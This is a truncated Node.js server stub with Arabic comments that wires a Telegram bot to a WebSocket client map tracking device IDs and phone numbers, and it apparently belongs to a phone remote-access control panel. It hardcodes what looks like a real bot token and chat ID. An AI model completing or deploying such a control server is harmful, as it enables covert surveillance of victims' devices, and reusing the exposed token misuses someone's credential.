
// server.js المعدل
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '7552158276:AAG5A6T9YZP7x8MnYS27Guz-cjw_qhc1J_Y';
const id = '7530861564';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : ابو بحترة قناة المطور @sy22ii2002</h1>');
});

// ملاحظة: باقي الكود يُكمل هنا بنفس طريقة كودك الأصلي مع تعديلات الأسماء فقط
